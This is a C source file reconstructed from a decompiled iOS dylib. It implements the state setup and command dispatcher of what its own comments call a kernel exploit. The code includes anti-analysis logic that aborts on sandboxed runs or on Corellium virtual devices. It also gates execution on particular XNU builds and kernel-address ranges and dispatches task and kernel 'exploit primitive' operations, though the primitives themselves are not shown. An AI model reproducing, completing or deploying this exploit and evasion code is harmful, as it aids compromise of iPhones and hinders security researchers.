/*
 * record_0x90000_state_init.c
 * entry5_type0x09.dylib — state object init + command dispatcher
 *
 * sub_3f5e4  — allocate + init 0x1D60-byte state object
 * sub_3f708  — command dispatcher wrapper
 * sub_3f758  — main command dispatcher (40+ selectors)
 * sub_3f680  — state teardown / leak check
 *
 * Verified: struct offsets, selector values, control flow, error codes.
 * Inferred: role labels from call context and data flow.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <sys/sysctl.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <pthread.h>
#include <unistd.h>

/* sandbox_check — private API, not in public SDK headers */
extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
#define SANDBOX_CHECK_NO_REPORT 3

/* kIOMasterPortDefault unavailable on iOS — use 0 (MACH_PORT_NULL) */
#define kIOMasterPortDefault_compat ((mach_port_t)0)

/* ── state object size ───────────────────────────────────────────────────── */
#define STATE_SIZE  0x1D60

/* ── state field offsets (in uint32_t units unless noted) ───────────────── */
#define STATE_FLAGS         0x00    /* uint32 capability/state flags          */
#define STATE_KADDR         0x56    /* uint64 kernel address / slide          */
#define STATE_XNU_MAJOR     0x50    /* uint32 xnu major build number          */
#define STATE_TIMEBASE      0x97    /* mach_timebase_info_t                   */
#define STATE_MUTEX_A       0x9a    /* pthread_mutex_t                        */
#define STATE_SEMAPHORE     0x99    /* semaphore_t                            */
#define STATE_MUTEX_B       0xcc    /* pthread_mutex_t                        */
#define STATE_FD0           0x64c   /* uint32 fd slot 0 (init 0xffffffff)     */
#define STATE_FD1           0x64d   /* uint32 fd slot 1                       */
#define STATE_FD2           0x64e   /* uint32 fd slot 2                       */
#define STATE_FD3           0x64f   /* uint32 fd slot 3                       */
#define STATE_FD4           0x650   /* uint32 fd slot 4                       */
#define STATE_FD5           0x651   /* uint32 fd slot 5                       */
#define STATE_STATUS        0x1918  /* uint32 cached status (read_status)     */

/* ── kernel address thresholds ──────────────────────────────────────────── */
#define KADDR_PATH_C_MAX    0x1F530F02800000ULL
#define KADDR_PATH_B_MIN    0x1F530F02800000ULL
#define KADDR_PATH_B_MAX    0x225C1E804FFFFFULL
#define KADDR_PATH_A_MIN    0x225C1980500000ULL
#define KADDR_NEWEST        0x27120F04B00003ULL

/* ── forward declarations ────────────────────────────────────────────────── */
static int  sub_3dd40(uint32_t *state, int mode);   /* main exploit init     */
static void sub_3f680(long state);                  /* teardown / leak check */

/* internal exploit helpers — implemented in record_0x90000_exploit.c */
extern int  sub_24bdc(int arg);
extern int  sub_24cec(uint32_t *state);
extern int  sub_374e0(uint32_t *state, uint32_t flags);
extern int  sub_1dd4c(uint32_t *state, void *out);  /* state inherit path C  */
extern int  sub_1e090(uint32_t *state, void *out);  /* state inherit path B  */
extern int  sub_1f1b8(uint32_t *state, void *out);  /* state inherit path A  */
extern int  sub_d5e0 (uint32_t *state, void **out); /* newest inherit path  */
extern int  sub_f15c (uint32_t *state, uint64_t a1, int a2, uint32_t *out);
extern int  sub_26de8(uint32_t *state);
extern int  sub_267a8(uint32_t *state);
extern int  sub_3d4a8(uint32_t *state, mach_port_t task, int a2, void *out);
extern int  sub_418c8(void);
extern void sub_371d0(uint32_t *state, uint32_t flag);
extern int  sub_37238_check(uint32_t *state, uint32_t mask);

/* dispatcher helpers */
extern void sub_3ca24(long state, int a1, int *a2, long a3, long a4);
extern void sub_3c354(long state, mach_port_t task, char f4, char f6, char f5);
extern void sub_3b7f4(long state, int a1, int a2, int a3);
extern void sub_247f8(long state, int mode);
extern void sub_3c034(long state, mach_port_t task, int a2);
extern void sub_3bec4(long state, mach_port_t task);
extern void sub_2358c(long state, int *out, int size);
extern void sub_2e0b0(long state, mach_port_t task, uint64_t ent, int flags);

/* ── sub_3f5e4 — allocate and init state object ─────────────────────────── */
int sub_3f5e4(void **out_state)
{
    uint32_t *state = calloc(STATE_SIZE, 1);
    if (!state) return -1;

    int rc = sub_3dd40(state, 1);  /* mode=1 → ~param_2 & 1 = 0 */
    if (rc == 0) {
        *out_state = state;
        sub_3f680((long)state);
    } else {
        free(state);
    }
    return rc;
}

/* ── sub_3f680 — teardown / leak check ──────────────────────────────────── */
/*
 * Asserts that six key state pointers are NULL before returning.
 * If any is non-NULL, calls sub_1af28 (abort/panic path).
 */
static void sub_3f680(long state)
{
    extern void sub_1af28(void);  /* abort/panic */

    static const int offsets[] = { 0x19f8, 0x1d18, 0x1d20,
                                   0x1d28, 0x1d30, 0x1d38 };
    for (int i = 0; i < 6; i++) {
        if (*(long *)(state + offsets[i]) != 0)
            sub_1af28();
    }
}

/* ── sub_3dd40 — main state init (exploit setup) ────────────────────────── */
static int sub_3dd40(uint32_t *state, int mode)
{
    /* initialise fd slots to sentinel 0xffffffff */
    for (int i = 0; i < 6; i++)
        state[STATE_FD0 + i] = 0xffffffff;

    mach_timebase_info((struct mach_timebase_info *)(state + STATE_TIMEBASE));
    pthread_mutex_init((pthread_mutex_t *)(state + STATE_MUTEX_B), NULL);
    pthread_mutex_init((pthread_mutex_t *)(state + STATE_MUTEX_A), NULL);

    kern_return_t kr = semaphore_create(mach_task_self(),
                                        (semaphore_t *)(state + STATE_SEMAPHORE),
                                        SYNC_POLICY_FIFO, 0);
    if (kr != 0) goto fail;

    /* ── anti-analysis: sandbox + Corellium checks ── */
    pid_t pid = getpid();
    int sandboxed = sandbox_check(pid, "iokit-get-properties",
                                  SANDBOX_CHECK_NO_REPORT);
    if (sandboxed < 1) {
        io_registry_entry_t entry =
        IORegistryEntryFromPath(kIOMasterPortDefault_compat, "IODeviceTree:/");
        if (entry) {
            CFStringRef key = CFStringCreateWithCString(
                kCFAllocatorDefault, "IOPlatformSerialNumber",
                kCFStringEncodingUTF8);
            if (key) {
                CFTypeRef prop = IORegistryEntryCreateCFProperty(
                    entry, key, kCFAllocatorDefault, 0);
                if (prop) {
                    if (CFGetTypeID(prop) == CFStringGetTypeID()) {
                        CFStringRef corellium = CFStringCreateWithCString(
                            kCFAllocatorDefault, "CORELLIUM",
                            kCFStringEncodingUTF8);
                        int is_corellium = CFStringHasPrefix(
                            (CFStringRef)prop, corellium);
                        CFRelease(corellium);
                        CFRelease(prop);
                        CFRelease(key);
                        IOObjectRelease(entry);
                        if (is_corellium) goto fail;
                        goto passed_corellium;
                    }
                }
                CFRelease(key);
            }
            IOObjectRelease(entry);
        }
    }

passed_corellium:;
    /* ── CPU family / kernel version gating ── */
    long cpu_info = sub_418c8();
    if (!cpu_info) goto fail;

    uint32_t xnu = state[STATE_XNU_MAJOR];
    /* accepted xnu builds: 0x1c1b, 0x1809, 0x1f53..0x1f54, 0x2258, 0x225c, 0x2712 */
    int valid_build = (xnu == 0x1c1b || xnu == 0x1809 ||
                       (xnu >= 0x1f53 && xnu <= 0x1f54) ||
                       xnu == 0x2258 || xnu == 0x225c || xnu == 0x2712);
    if (!valid_build) goto fail;

    if (xnu > 0x1c1a) {
        uint8_t flag = (uint8_t)sub_24bdc(
            (*(uint64_t *)(state + STATE_KADDR) >> 0x2b) > 0x44a);
        ((uint8_t *)state)[0xb] = flag;
    }

    /* ── state inheritance (fast path — skip full exploit if prior run) ── */
    if (mode) {
        uint64_t kaddr = *(uint64_t *)(state + STATE_KADDR);
        void *inherit_out = NULL;
        int inherited;

        if (kaddr >= KADDR_NEWEST) {
            inherited = sub_d5e0(state, &inherit_out);
        } else if (kaddr >= KADDR_PATH_A_MIN &&
                   (state[STATE_FLAGS] & 0x5584001) &&
                   !(state[STATE_FLAGS] & 1)) {
            inherited = sub_1e090(state, &inherit_out);
        } else if (kaddr >= KADDR_PATH_B_MIN) {
            inherited = sub_1dd4c(state, &inherit_out);
        } else {
            inherited = sub_1f1b8(state, &inherit_out);
        }

        if (!inherited) goto fail;
    }

    /* ── full exploit path ── */
    if (sub_24cec(state) != 0) goto fail;
    if (sub_374e0(state, 0x200) != 0) goto fail;

    return 0;

fail:
    return -1;
}

/* forward declare before use */
static void sub_3f758(long state, uint64_t cmd, int *out);

/* ── sub_3f708 — dispatcher wrapper ─────────────────────────────────────── */
void sub_3f708(void *session, uint64_t cmd)
{
    sub_3f758((long)session, cmd, NULL);
}

/* ── sub_3f758 — main command dispatcher ────────────────────────────────── */
/*
 * Selector families:
 *   family 0 (cmd & 0xFF00 == 0x000): general task/kernel ops
 *   family 1 (cmd & 0xFF00 == 0x100): exploit primitive ops
 *   family 3 (cmd & 0xFF00 == 0x300): older-kernel ops (xnu <= 8791)
 */
static void sub_3f758(long state, uint64_t cmd, int *out)
{
    if ((cmd >> 0x1e & 3) != 0 && out == NULL) return;

    /* clear scratch fields */
    *(uint64_t *)(state + 0x18c0) = 0;
    *(uint64_t *)(state + 0x18b8) = 0;

    /* re-init task context */
    sub_3d4a8((uint32_t *)state, mach_task_self(), 0, 0);

    uint32_t sel   = (uint32_t)cmd;
    uint32_t fam   = (sel >> 8) & 0xff;

    if (fam == 1) {
        if (sel == 0x40000105)
            sub_2358c(state, out, 0x14);
    } else if (fam == 0) {
        if ((int)sel < 0x16) {
            switch (sel) {
            case 0xc000001bu:
                /* query available capability bitmask */
                if (sub_37238_check((uint32_t *)state, 0x5184001) ||
                    (sub_37238_check((uint32_t *)state, 0x200) &&
                     *(int *)(state + 0x140) > 0x1808))
                    sub_3ca24(state, *out, out + 1,
                              (long)out + 6, (long)out + 5);
                break;
            case 8:
                sub_3b7f4(state, 0, 0, 0);
                break;
            case 10:
                sub_247f8(state, 1);
                break;
            case 13:
            case 22:
                sub_3c034(state, mach_task_self(), 0);
                break;
            }
        } else {
            switch (sel) {
            case 0x40000010: {
                mach_port_t task = out ? *out : mach_task_self();
                sub_2e0b0(state, task,
                          *(uint64_t *)(out + 2), out[5]);
                break;
            }
            case 0x4000001b:
                /* task flag setter */
                if (sub_37238_check((uint32_t *)state, 0x5184001) == 0 ||
                    (sub_37238_check((uint32_t *)state, 0x200) &&
                     *(int *)(state + 0x140) >= 0x1809)) {
                    mach_port_t task = out ? *out : mach_task_self();
                    sub_3c354(state, task,
                              (char)out[1],
                              *(char *)((long)out + 6),
                              *(char *)((long)out + 5));
                }
                break;
            case 0x26:
                sub_3bec4(state, mach_task_self());
                break;
            }
        }
    }

    sub_3f680(state);
}
